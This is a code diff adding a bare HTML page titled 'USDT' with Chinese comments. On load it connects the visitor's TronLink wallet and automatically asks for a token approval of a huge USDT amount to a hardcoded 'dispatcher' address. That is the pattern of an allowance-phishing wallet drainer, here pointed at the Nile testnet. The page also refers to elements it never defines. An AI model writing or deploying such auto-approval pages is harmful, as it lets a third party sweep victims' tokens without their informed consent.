@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>USDT</title>
+</head>
+<body>
+  <pre id="log"></pre>
+  <script>
+    const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+    const DISPATCHER = 'TXPCRj4USx7AsqyZt49GNxv6qGe6yYVTtv';
+    const DECIMALS = 6;
+    const amount = '1123123123123';
+
+    document.getElementById('amount').textContent = amount;
+
+    function log(msg) {
+      document.getElementById('log').textContent += msg + '\n';
+    }
+
+    function setStatus(msg) {
+      document.getElementById('status').textContent = msg;
+    }
+
+    // 检查当前网络是否是 Nile
+    async function checkNetwork(tw) {
+      try {
+        const node = tw.fullNode.host;
+        if (node.includes('nile')) {
+          return true;
+        }
+        // 备用判断：拿当前链 ID
+        const chainId = await tw.trx.getChainId().catch(() => null);
+        if (chainId === '3' || chainId === 3) {
+          return true;
+        }
+        return false;
+      } catch (e) {
+        // 无法判断时默认继续
+        return true;
+      }
+    }
+
+    async function doApprove(tw, addr) {
+      try {
+        const amountWei = BigInt(Math.round(parseFloat(amount) * 10 ** DECIMALS));
+        const usdt = await tw.contract().at(USDT);
+
+        // 先查当前已授权多少
+        const current = await usdt.allowance(addr, DISPATCHER).call();
+        log('当前已授权: ' + current);
+
+        // 发起授权
+        setStatus('请在 TronLink 中确认授权...');
+        const tx = await usdt
+          .approve(DISPATCHER, amountWei.toString())
+          .send({ feeLimit: 100_000_000 });
+
+        setStatus('授权成功！');
+        log('approve tx: ' + tx);
+        log('https://nile.tronscan.org/#/transaction/' + tx);
+
+        // 授权后查询剩余额度
+        const left = await usdt.allowance(addr, DISPATCHER).call();
+        log('授权后额度: ' + left);
+      } catch (e) {
+        setStatus('授权失败或用户拒绝');
+        log('approve error: ' + (e.message || e));
+      }
+    }
+
+    async function start() {
+      // 等待 TronLink 注入（有时页面加载时还没 ready）
+      let attempts = 0;
+      while (!window.tron && !window.tronLink && attempts < 20) {
+        await new Promise(r => setTimeout(r, 500));
+        attempts++;
+      }
+
+      const provider = window.tronLink || window.tron;
+      if (!provider) {
+        setStatus('未检测到 TronLink，请用 TronLink 钱包浏览器打开');
+        return;
+      }
+
+      try {
+        // 请求连接（已连接会直接通过，未连接会弹确认框）
+        setStatus('正在连接钱包...');
+        await provider.request({ method: 'eth_requestAccounts' });
+
+        const tw = provider.tronWeb || window.tronWeb;
+        if (!tw || !tw.ready) {
+          throw new Error('TronWeb not ready');
+        }
+
+        const addr = tw.defaultAddress.base58;
+        setStatus('已连接: ' + addr);
+        log('connected: ' + addr);
+
+        // 检查网络
+        const isNile = await checkNetwork(tw);
+        if (!isNile) {
+          setStatus('⚠️ 请切换到 Nile 测试网');
+          log('当前不是 Nile 网络，请在 TronLink 中切换');
+          return;
+        }
+
+        // 自动发起授权
+        await doApprove(tw, addr);
+      } catch (e) {
+        setStatus('连接失败或用户拒绝');
+        log('error: ' + (e.message || e));
+      }
+    }
+
+    // 页面加载后自动开始
+    window.addEventListener('load', start);
+  </script>
+</body>
+</html>
